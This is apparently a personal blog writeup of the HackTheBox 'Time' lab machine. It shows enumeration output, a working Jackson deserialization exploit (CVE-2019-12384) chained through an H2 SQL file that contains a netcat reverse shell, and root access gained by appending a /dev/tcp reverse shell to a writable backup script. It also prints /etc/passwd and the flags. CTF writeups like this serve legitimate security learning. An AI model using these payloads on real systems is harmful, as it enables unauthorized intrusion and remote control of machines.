---
layout: post
title: "Time Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Time

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.150.73 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
Summary   : JQuery[3.2.1], Bootstrap, Script, HTML5, Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
```

```
Path: http://10.129.150.73:80/vendor/bootstrap/js/popper.js

```

```
[-] [10.129.143.171 tcp/80/nmap-http] |          * @fileOverview Kickass library to create and place poppers near their reference elements.
[-] [10.129.143.171 tcp/80/nmap-http] |          * @version 1.12.5

```

```
/images               (Status: 301) [Size: 317] [--> http://10.129.150.73/images/]
/css                  (Status: 301) [Size: 314] [--> http://10.129.150.73/css/]
/js                   (Status: 301) [Size: 313] [--> http://10.129.150.73/js/]
/javascript           (Status: 301) [Size: 321] [--> http://10.129.150.73/javascript/]
/vendor               (Status: 301) [Size: 317] [--> http://10.129.150.73/vendor/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.150.73/fonts/]
/server-status        (Status: 403) [Size: 279]
```

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.150.73
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://10.129.150.73:80/
|     Form id:
|_    Form action:
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter:
|
|     Couldn't find a file-type field.
|
|_    Couldn't find a file-type field.
| http-internal-ip-disclosure:
|_  Internal IP Leaked: 127.0.1.1

```

```
|     Path: http://10.129.150.73:80/vendor/select2/select2.min.js
|     Line number: 1
|     Comment:
|         /*! Select2 4.0.3 | https://github.com/select2/select2/blob/master/LICENSE.md */
|
```

```
|     Path: http://10.129.150.73:80/vendor/bootstrap/js/bootstrap.min.js
|     Line number: 1
|     Comment:
|         /*!
|          * Bootstrap v4.0.0-beta (https://getbootstrap.com)
|          * Copyright 2011-2017 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
|          * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
|          */
```

```
| http-sitemap-generator:
|   Directory structure:
|     /
|       Other: 1
|     /css/
|       css: 2
|     /fonts/Linearicons-Free-v1.0.0/
|       css: 1
|     /fonts/font-awesome-4.7.0/css/
|       css: 1
|     /images/icons/
|       ico: 1
|     /js/
|       js: 1
|     /vendor/animate/
|       css: 1
|     /vendor/bootstrap/css/
|       css: 1
|     /vendor/bootstrap/js/
|       js: 2
|     /vendor/css-hamburgers/
|       css: 1
|     /vendor/jquery/
|       js: 1
|     /vendor/select2/
|       css: 1; js: 1
|   Longest directory structure:
|     Depth: 3
|     Dir: /vendor/bootstrap/js/
|   Total files found (by extension):
|_    Other: 1; css: 8; ico: 1; js: 5
```

```
|   cpe:/a:openbsd:openssh:8.2p1:
|       EDB-ID:21018    10.0    https://vulners.com/exploitdb/EDB-ID:21018  *EXPLOIT*
|       CVE-2001-0554   10.0    https://vulners.com/cve/CVE-2001-0554
```

## Exploitation

That site is vulnerable for XSS, but I can not get it to RCE using the following syntax:

```
"<BODY ONLOAD=alert('ls -al')>"
```

I did get this error message:

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input
```

Which made me think of a java library called jackson. Found this exploit: https://github.com/jas502n/CVE-2019-12384 Tried it:

Made a file called inject.sql:

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.89 1234 >/tmp/f')
```

Inputted this in the validate field:

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.89/inject.sql'"}]
```

And we have shell:

```
kali@kali:~/Desktop/DownloadedScripts$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.89] from time.htb [10.129.150.73] 58332
/bin/sh: 0: can't access tty; job control turned off
$ whoami
pericles
$ id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
$ pwd
/var/www/html
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
$

```

```
$ cat user.txt
8c18cfcf07d6239529518f4e7a0d1cf0
$

```

Privesc time:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

```

```
+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh
```

```
[+] Unexpected in root
/lib32
/lost+found
/libx32
/test

```

```
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group pericles:
/usr/bin/timer_backup.sh

```

So we can write to the file

```
pericles@time:/$ echo 'bash -i >& /dev/tcp/10.10.14.89/4444 0>&1' >> /usr/bin/timer_backup.sh
</10.10.14.89/4444 0>&1' >> /usr/bin/timer_backup.sh

pericles@time:/$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
bash -i >& /dev/tcp/10.10.14.89/4444 0>&1
pericles@time:/$

```

If you start a listener you get a root shell, but it is very unstable, but rce is possible

```
echo 'bash -i >& /dev/tcp/10.10.14.89/4444 0>&1' >> /usr/bin/timer_backup.sh
```

Followed by:

```
kali@kali:~/Desktop/DownloadedScripts$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.89] from time.htb [10.129.150.73] 56632
bash: cannot set terminal process group (64425): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# cat /root/root.txt
cat /root/root.txt
0c95d0231d9b882b6400a52ea1e9ea65
root@time:/# exit

```

## Final thoughts

Privesc was ezpz, initial foothold not so much. Learned something new.
